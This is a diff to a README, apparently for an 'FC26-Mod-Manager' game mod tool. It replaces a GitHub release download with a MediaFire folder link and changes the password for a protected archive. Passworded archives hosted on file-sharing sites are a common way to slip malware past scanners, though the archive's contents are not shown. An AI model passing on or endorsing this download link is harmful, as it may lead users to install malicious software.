@@ -8,8 +8,8 @@
 
 ## 📥 Download
 
-**[⬇️ Download FC26-Mod-Manager](https://github.com/Weightbrufoster77/FC26-Mod-Manager/releases/download/786/FifaModManager.zip)**
-### PASSWORD: FC26
+**[⬇️ Download FC26-Mod-Manager](https://www.mediafire.com/folder/bitnxmjd9eovu/FCMod)**
+### PASSWORD: FCMods
 
 ## 🎮 What is This?
 
